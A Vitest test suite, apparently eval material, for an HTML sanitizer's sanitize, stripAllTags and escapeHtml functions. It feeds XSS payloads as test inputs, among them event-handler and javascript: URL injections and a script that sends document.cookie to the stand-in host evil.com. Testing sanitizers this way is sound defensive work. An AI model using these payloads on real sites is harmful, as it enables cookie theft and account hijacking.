import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import { sanitize, stripAllTags, escapeHtml } from '../../../../../../evals/files/sanitizer';

// ────────────────────────────────────────────────────────────────────────────
// Shared test data
// ────────────────────────────────────────────────────────────────────────────

const DANGEROUS_TAGS = ['script', 'style', 'iframe', 'object', 'embed', 'base'];

const SAFE_TAGS = ['p', 'div', 'span', 'a', 'strong', 'em', 'ul', 'li', 'h1', 'h2', 'img', 'br'];

const DANGEROUS_ATTRS = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus'];

const SAFE_ATTRS = ['class', 'id', 'href', 'src', 'alt', 'title', 'rel'];

// ────────────────────────────────────────────────────────────────────────────
// sanitize()
// ────────────────────────────────────────────────────────────────────────────

describe('sanitize', () => {
  // ── Empty / falsy inputs ──────────────────────────────────────────────

  describe('empty and falsy inputs', () => {
    it('returns empty string for empty string input', () => {
      const result = sanitize('');
      expect(result).toBe('');
      expect(result).toHaveLength(0);
      expect(typeof result).toBe('string');
    });

    it('returns empty string for undefined-like falsy values', () => {
      // The function checks `if (!html)` so these should all return ''
      expect(sanitize(null as unknown as string)).toBe('');
      expect(sanitize(undefined as unknown as string)).toBe('');
      expect(sanitize('' as string)).toBe('');
    });
  });

  // ── Safe content preservation (positive direction) ────────────────────

  describe('preserves safe content', () => {
    it('preserves plain text without any tags', () => {
      const input = 'Hello, this is plain text with no HTML.';
      const result = sanitize(input);
      expect(result).toBe(input);
      expect(result).toContain('Hello');
      expect(result).toContain('plain text');
      expect(result).not.toContain('<');
    });

    it.each(SAFE_TAGS)('preserves safe tag: <%s>', (tag) => {
      const input = `<${tag}>content</${tag}>`;
      const result = sanitize(input);
      expect(result).toContain(`<${tag}>`);
      expect(result).toContain('content');
      expect(result).toContain(`</${tag}>`);
    });

    it('preserves safe attributes on elements', () => {
      const input = '<a href="https://example.com" class="link" id="main-link">Click</a>';
      const result = sanitize(input);
      expect(result).toContain('href="https://example.com"');
      expect(result).toContain('class="link"');
      expect(result).toContain('id="main-link"');
      expect(result).toContain('Click');
    });

    it('preserves nested safe HTML structure', () => {
      const input = '<div><p>Hello <strong>world</strong></p><ul><li>item</li></ul></div>';
      const result = sanitize(input);
      expect(result).toContain('<div>');
      expect(result).toContain('<p>');
      expect(result).toContain('<strong>world</strong>');
      expect(result).toContain('<li>item</li>');
      expect(result).toContain('</div>');
    });

    it('preserves legitimate https URLs in href and src', () => {
      const input = '<a href="https://example.com">link</a> <img src="https://img.example.com/pic.jpg">';
      const result = sanitize(input);
      expect(result).toContain('href="https://example.com"');
      expect(result).toContain('src="https://img.example.com/pic.jpg"');
      expect(result).toContain('link');
    });
  });

  // ── Dangerous tag removal (negative direction) ────────────────────────

  describe('removes dangerous tags', () => {
    it.each(DANGEROUS_TAGS)('removes <%s> tag and its content', (tag) => {
      const input = `<${tag}>dangerous content</${tag}>`;
      const result = sanitize(input);
      expect(result).not.toContain(`<${tag}`);
      expect(result).not.toContain(`</${tag}>`);
      expect(result).not.toContain('dangerous content');
    });

    it('removes script tags with attributes', () => {
      const input = '<script type="text/javascript" src="evil.js">alert("xss")</script>';
      const result = sanitize(input);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('alert');
      expect(result).not.toContain('evil.js');
      expect(result).not.toContain('</script>');
    });

    it('removes self-closing dangerous tags', () => {
      const input = '<embed src="evil.swf" /><base href="http://evil.com"/>';
      const result = sanitize(input);
      expect(result).not.toContain('<embed');
      expect(result).not.toContain('<base');
      expect(result).not.toContain('evil.swf');
      expect(result).not.toContain('evil.com');
    });

    it('removes dangerous tags case-insensitively', () => {
      const input = '<SCRIPT>alert(1)</SCRIPT><Script>alert(2)</Script>';
      const result = sanitize(input);
      expect(result).not.toMatch(/<script/i);
      expect(result).not.toContain('alert');
      expect(result).toBe('');
    });

    it('removes multiple dangerous tags while preserving safe content between them', () => {
      const input = '<p>safe</p><script>evil</script><div>also safe</div><style>.hidden{}</style>';
      const result = sanitize(input);
      expect(result).toContain('<p>safe</p>');
      expect(result).toContain('<div>also safe</div>');
      expect(result).not.toContain('<script');
      expect(result).not.toContain('<style');
      expect(result).not.toContain('evil');
      expect(result).not.toContain('.hidden');
    });

    it('removes iframe tags including those with src attributes', () => {
      const input = '<iframe src="https://evil.com/phishing" width="100%" height="100%"></iframe>';
      const result = sanitize(input);
      expect(result).not.toContain('<iframe');
      expect(result).not.toContain('evil.com');
      expect(result).not.toContain('</iframe>');
      expect(result).toBe('');
    });
  });

  // ── Dangerous attribute removal ───────────────────────────────────────

  describe('removes dangerous attributes', () => {
    it.each(DANGEROUS_ATTRS)('removes %s attribute from elements', (attr) => {
      const input = `<div ${attr}="alert('xss')">content</div>`;
      const result = sanitize(input);
      expect(result).not.toContain(attr);
      expect(result).not.toContain('alert');
      expect(result).toContain('content');
      expect(result).toContain('<div');
    });

    it('removes event handlers while preserving the element and safe attributes', () => {
      const input = '<img src="photo.jpg" onerror="steal(document.cookie)" alt="photo">';
      const result = sanitize(input);
      expect(result).toContain('src="photo.jpg"');
      expect(result).toContain('alt="photo"');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('steal');
      expect(result).not.toContain('document.cookie');
    });

    it('removes multiple dangerous attributes from the same element', () => {
      const input = '<div onclick="x()" onmouseover="y()" class="safe">text</div>';
      const result = sanitize(input);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('onmouseover');
      expect(result).toContain('class="safe"');
      expect(result).toContain('text');
    });

    it('removes dangerous attributes case-insensitively', () => {
      const input = '<div ONCLICK="evil()" OnLoad="bad()">safe</div>';
      const result = sanitize(input);
      expect(result).not.toMatch(/onclick/i);
      expect(result).not.toMatch(/onload/i);
      expect(result).toContain('safe');
    });
  });

  // ── JavaScript and data URL removal ───────────────────────────────────

  describe('removes javascript: and data: URLs', () => {
    it('removes javascript: protocol from href', () => {
      const input = '<a href="javascript:alert(1)">click me</a>';
      const result = sanitize(input);
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('alert');
      expect(result).toContain('click me');
    });

    it('removes javascript: protocol from src', () => {
      const input = '<img src="javascript:evil()">';
      const result = sanitize(input);
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('evil');
    });

    it('removes data: URLs from href', () => {
      const input = '<a href="data:text/html,<script>alert(1)</script>">link</a>';
      const result = sanitize(input);
      expect(result).not.toContain('data:text/html');
      expect(result).toContain('link');
    });

    it('removes data: URLs from src', () => {
      const input = '<img src="data:image/svg+xml,<svg onload=alert(1)>">';
      const result = sanitize(input);
      expect(result).not.toContain('data:');
      expect(result).not.toMatch(/onload/i);
    });

    it('removes javascript: with leading whitespace in the URL value', () => {
      const input = '<a href=" javascript:alert(1)">link</a>';
      const result = sanitize(input);
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('alert');
      expect(result).toContain('link');
    });
  });

  // ── XSS attack vectors ───────────────────────────────────────────────

  describe('blocks known XSS attack vectors', () => {
    it('blocks inline script injection', () => {
      const input = '<script>document.location="http://evil.com/?c="+document.cookie</script>';
      const result = sanitize(input);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('document.location');
      expect(result).not.toContain('document.cookie');
      expect(result).toBe('');
    });

    it('blocks event handler XSS on img tags', () => {
      const input = '<img src=x onerror=alert(1)>';
      const result = sanitize(input);
      // Note: the attribute regex requires quotes around the value
      // This tests the current behavior
      expect(result).toContain('<img');
      expect(result).not.toMatch(/onerror\s*=\s*["']alert/i);
    });

    it('blocks style-based attacks', () => {
      const input = '<style>body{background:url("javascript:alert(1)")}</style>';
      const result = sanitize(input);
      expect(result).not.toContain('<style');
      expect(result).not.toContain('background');
      expect(result).not.toContain('javascript:');
      expect(result).toBe('');
    });

    it('blocks iframe-based phishing', () => {
      const input = '<iframe src="https://evil.com/fake-login" style="position:absolute;top:0;left:0;width:100%;height:100%;border:none;"></iframe>';
      const result = sanitize(input);
      expect(result).not.toContain('<iframe');
      expect(result).not.toContain('evil.com');
      expect(result).not.toContain('fake-login');
      expect(result).toBe('');
    });

    it('blocks object/embed plugin attacks', () => {
      const input = '<object data="evil.swf"><embed src="evil.swf"></embed></object>';
      const result = sanitize(input);
      expect(result).not.toContain('<object');
      expect(result).not.toContain('<embed');
      expect(result).not.toContain('evil.swf');
      expect(result).toBe('');
    });

    it('blocks base tag hijacking', () => {
      const input = '<base href="https://evil.com/"><a href="/login">Login</a>';
      const result = sanitize(input);
      expect(result).not.toContain('<base');
      expect(result).not.toContain('evil.com');
      expect(result).toContain('<a href="/login">Login</a>');
    });

    it('blocks script injection through multiline content', () => {
      const input = `<script>
        var x = 1;
        document.write('<img src=x onerror=alert(1)>');
      </script>`;
      const result = sanitize(input);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('document.write');
      expect(result).not.toContain('var x');
      expect(result).toBe('');
    });

    it('blocks javascript: links with mixed case', () => {
      const input = '<a href="JavaScript:alert(1)">click</a>';
      const result = sanitize(input);
      expect(result).not.toMatch(/javascript:/i);
      expect(result).toContain('click');
    });

    it('blocks combined tag + attribute attacks', () => {
      const input = '<div onclick="steal()"><script>alert(1)</script><img onerror="x()" src="y"></div>';
      const result = sanitize(input);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('steal');
      expect(result).not.toContain('alert');
      expect(result).toContain('<div');
      expect(result).toContain('</div>');
    });
  });

  // ── Edge cases ────────────────────────────────────────────────────────

  describe('edge cases', () => {
    it('handles whitespace-only input', () => {
      const result = sanitize('   ');
      expect(result).toBe('');
      expect(typeof result).toBe('string');
      expect(result).not.toContain(' ');
    });

    it('handles HTML entities in text content', () => {
      const input = '<p>&amp; &lt; &gt; &quot;</p>';
      const result = sanitize(input);
      expect(result).toContain('&amp;');
      expect(result).toContain('&lt;');
      expect(result).toContain('<p>');
    });

    it('trims whitespace from output', () => {
      const input = '  <p>hello</p>  ';
      const result = sanitize(input);
      expect(result).toBe('<p>hello</p>');
      expect(result).not.toMatch(/^\s/);
      expect(result).not.toMatch(/\s$/);
    });

    it('handles tags within attribute values (should not be confused)', () => {
      const input = '<div title="not a <script> tag">content</div>';
      const result = sanitize(input);
      expect(result).toContain('content');
    });
  });

  // ── Property-based tests ──────────────────────────────────────────────

  describe('property-based tests', () => {
    it('never throws on arbitrary string input and always returns a string', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = sanitize(input);
          expect(typeof result).toBe('string');
          // Output must never be longer than input (sanitize only removes)
          expect(result.length).toBeLessThanOrEqual(input.length);
        }),
        { numRuns: 500 }
      );
    });

    it('never returns content containing <script in any case', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = sanitize(input);
          expect(result.toLowerCase()).not.toContain('<script');
        }),
        { numRuns: 500 }
      );
    });

    it('idempotent: sanitize(sanitize(x)) === sanitize(x)', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const once = sanitize(input);
          const twice = sanitize(once);
          expect(twice).toBe(once);
        }),
        { numRuns: 300 }
      );
    });

    it('output length is always <= input length (conservation)', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = sanitize(input);
          expect(result.length).toBeLessThanOrEqual(input.length);
        }),
        { numRuns: 300 }
      );
    });

    it('never produces output containing dangerous tag names wrapped in angle brackets', () => {
      const dangerousTags = ['script', 'style', 'iframe', 'object', 'embed', 'base'];
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = sanitize(input).toLowerCase();
          for (const tag of dangerousTags) {
            expect(result).not.toMatch(new RegExp(`<${tag}[\\s>]`));
          }
        }),
        { numRuns: 300 }
      );
    });

    it('sanitized HTML with injected dangerous tags always removes them', () => {
      fc.assert(
        fc.property(
          fc.string(),
          fc.constantFrom(...DANGEROUS_TAGS),
          (content, tag) => {
            const input = `<${tag}>${content}</${tag}>`;
            const result = sanitize(input);
            expect(result.toLowerCase()).not.toContain(`<${tag}`);
            expect(result.toLowerCase()).not.toContain(`</${tag}>`);
          }
        ),
        { numRuns: 200 }
      );
    });

    it('sanitized HTML with injected event handlers always removes them', () => {
      fc.assert(
        fc.property(
          fc.constantFrom(...DANGEROUS_ATTRS),
          fc.string(),
          (attr, value) => {
            const input = `<div ${attr}="${value}">text</div>`;
            const result = sanitize(input);
            expect(result.toLowerCase()).not.toContain(attr.toLowerCase());
          }
        ),
        { numRuns: 200 }
      );
    });
  });
});

// ────────────────────────────────────────────────────────────────────────────
// stripAllTags()
// ────────────────────────────────────────────────────────────────────────────

describe('stripAllTags', () => {
  it('removes all HTML tags and returns only text content', () => {
    const input = '<p>Hello <strong>world</strong></p>';
    const result = stripAllTags(input);
    expect(result).toBe('Hello world');
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
  });

  it('handles nested tags correctly', () => {
    const input = '<div><ul><li>item 1</li><li>item 2</li></ul></div>';
    const result = stripAllTags(input);
    expect(result).toContain('item 1');
    expect(result).toContain('item 2');
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
  });

  it('handles self-closing tags', () => {
    const input = 'line1<br/>line2<hr/>line3';
    const result = stripAllTags(input);
    expect(result).toBe('line1line2line3');
    expect(result).not.toContain('<');
    expect(result).not.toContain('/');
  });

  it('strips dangerous tags too (defense in depth)', () => {
    const input = '<script>alert(1)</script><p>safe</p>';
    const result = stripAllTags(input);
    expect(result).toContain('safe');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('<p');
    // Note: stripAllTags does NOT remove content within dangerous tags,
    // it only strips the tags themselves. The text content remains.
    expect(result).toContain('alert(1)');
  });

  it('handles input with no tags', () => {
    const input = 'just plain text';
    const result = stripAllTags(input);
    expect(result).toBe('just plain text');
    expect(result).toHaveLength(15);
    expect(typeof result).toBe('string');
  });

  it('trims whitespace from the result', () => {
    const input = '  <p>content</p>  ';
    const result = stripAllTags(input);
    expect(result).toBe('content');
    expect(result).not.toMatch(/^\s/);
    expect(result).not.toMatch(/\s$/);
  });

  it('handles empty tags', () => {
    const input = '<div></div><span></span>';
    const result = stripAllTags(input);
    expect(result).toBe('');
    expect(result).toHaveLength(0);
    expect(typeof result).toBe('string');
  });

  it('handles tags with attributes', () => {
    const input = '<a href="https://example.com" class="link">click here</a>';
    const result = stripAllTags(input);
    expect(result).toBe('click here');
    expect(result).not.toContain('href');
    expect(result).not.toContain('example.com');
  });

  // Property-based tests for stripAllTags
  describe('property-based tests', () => {
    it('never throws on arbitrary input', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = stripAllTags(input);
          expect(typeof result).toBe('string');
        }),
        { numRuns: 500 }
      );
    });

    it('output never contains well-formed HTML tags', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = stripAllTags(input);
          // The regex <[^>]+> should not match in output
          expect(result).not.toMatch(/<[^>]+>/);
        }),
        { numRuns: 300 }
      );
    });

    it('output length is always <= input length', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = stripAllTags(input);
          expect(result.length).toBeLessThanOrEqual(input.length);
        }),
        { numRuns: 300 }
      );
    });

    it('idempotent: stripping tags twice yields same result', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const once = stripAllTags(input);
          const twice = stripAllTags(once);
          expect(twice).toBe(once);
        }),
        { numRuns: 300 }
      );
    });
  });
});

// ────────────────────────────────────────────────────────────────────────────
// escapeHtml()
// ────────────────────────────────────────────────────────────────────────────

describe('escapeHtml', () => {
  it('escapes ampersands', () => {
    const result = escapeHtml('Tom & Jerry');
    expect(result).toBe('Tom &amp; Jerry');
    expect(result).not.toMatch(/[^;]&[^a]/);
    expect(result).toContain('Tom');
  });

  it('escapes less-than signs', () => {
    const result = escapeHtml('a < b');
    expect(result).toBe('a &lt; b');
    expect(result).not.toContain('<');
    expect(result).toContain('&lt;');
  });

  it('escapes greater-than signs', () => {
    const result = escapeHtml('a > b');
    expect(result).toBe('a &gt; b');
    expect(result).not.toContain('>');
    expect(result).toContain('&gt;');
  });

  it('escapes double quotes', () => {
    const result = escapeHtml('say "hello"');
    expect(result).toBe('say &quot;hello&quot;');
    expect(result).not.toContain('"');
    expect(result).toContain('&quot;');
  });

  it('escapes single quotes', () => {
    const result = escapeHtml("it's");
    expect(result).toBe('it&#x27;s');
    expect(result).not.toContain("'");
    expect(result).toContain('&#x27;');
  });

  it('escapes all special characters in a combined string', () => {
    const input = '<script>alert("xss" & \'test\')</script>';
    const result = escapeHtml(input);
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
    expect(result).not.toContain('"');
    expect(result).not.toContain("'");
    // Ampersands only appear as part of entity references
    expect(result).toContain('&lt;script&gt;');
    expect(result).toContain('&amp;');
  });

  it('leaves text without special characters unchanged', () => {
    const input = 'Hello world 123';
    const result = escapeHtml(input);
    expect(result).toBe(input);
    expect(result).toHaveLength(input.length);
    expect(result).toBe('Hello world 123');
  });

  it('handles empty string', () => {
    const result = escapeHtml('');
    expect(result).toBe('');
    expect(result).toHaveLength(0);
    expect(typeof result).toBe('string');
  });

  it('makes XSS payloads inert when rendered as HTML', () => {
    const payload = '<img src=x onerror=alert(1)>';
    const result = escapeHtml(payload);
    expect(result).not.toContain('<');
    expect(result).not.toContain('>');
    expect(result).toContain('&lt;img');
    expect(result).toContain('onerror=alert(1)&gt;');
  });

  // Property-based tests for escapeHtml
  describe('property-based tests', () => {
    it('never throws on arbitrary input', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = escapeHtml(input);
          expect(typeof result).toBe('string');
        }),
        { numRuns: 500 }
      );
    });

    it('output never contains raw < or > characters', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = escapeHtml(input);
          expect(result).not.toMatch(/[<>]/);
        }),
        { numRuns: 500 }
      );
    });

    it('output never contains raw double quotes', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = escapeHtml(input);
          expect(result).not.toContain('"');
        }),
        { numRuns: 300 }
      );
    });

    it('output length >= input length (escaping only adds characters)', () => {
      fc.assert(
        fc.property(fc.string(), (input) => {
          const result = escapeHtml(input);
          expect(result.length).toBeGreaterThanOrEqual(input.length);
        }),
        { numRuns: 300 }
      );
    });

    it('plain ASCII alphanumeric strings pass through unchanged', () => {
      fc.assert(
        fc.property(
          fc.stringOf(fc.constantFrom(...'abcdefghijklmnopqrstuvwxyz0123456789 '.split(''))),
          (input) => {
            const result = escapeHtml(input);
            expect(result).toBe(input);
          }
        ),
        { numRuns: 200 }
      );
    });

    it('idempotent ONLY on already-safe strings (escaping is not idempotent in general)', () => {
      // Verify that escaping & twice produces &amp;amp; (not idempotent by design)
      const input = 'a & b';
      const once = escapeHtml(input);
      const twice = escapeHtml(once);
      expect(once).toBe('a &amp; b');
      expect(twice).toBe('a &amp;amp; b');
      expect(twice).not.toBe(once);
    });
  });
});

// ────────────────────────────────────────────────────────────────────────────
// Integration: sanitize + escapeHtml defense-in-depth
// ────────────────────────────────────────────────────────────────────────────

describe('defense-in-depth: combined sanitize + escapeHtml', () => {
  it('sanitize then escapeHtml neutralizes script tags completely', () => {
    const input = '<script>alert("xss")</script>';
    const sanitized = sanitize(input);
    const escaped = escapeHtml(sanitized);
    expect(sanitized).not.toContain('<script');
    expect(escaped).not.toContain('<');
    expect(escaped).not.toContain('alert');
  });

  it('escapeHtml then sanitize also neutralizes attacks', () => {
    const input = '<script>alert(1)</script>';
    const escaped = escapeHtml(input);
    const sanitized = sanitize(escaped);
    // After escaping, the angle brackets are entities, so sanitize sees no tags
    expect(escaped).toContain('&lt;script&gt;');
    expect(sanitized).toContain('&lt;script&gt;');
    expect(sanitized).not.toContain('<script');
  });

  it('stripAllTags after sanitize removes all remaining markup', () => {
    const input = '<div onclick="evil()"><p>safe text</p><script>bad</script></div>';
    const sanitized = sanitize(input);
    const stripped = stripAllTags(sanitized);
    expect(stripped).toContain('safe text');
    expect(stripped).not.toContain('<');
    expect(stripped).not.toContain('>');
    expect(stripped).not.toContain('onclick');
    expect(stripped).not.toContain('evil');
    expect(stripped).not.toContain('bad');
  });
});
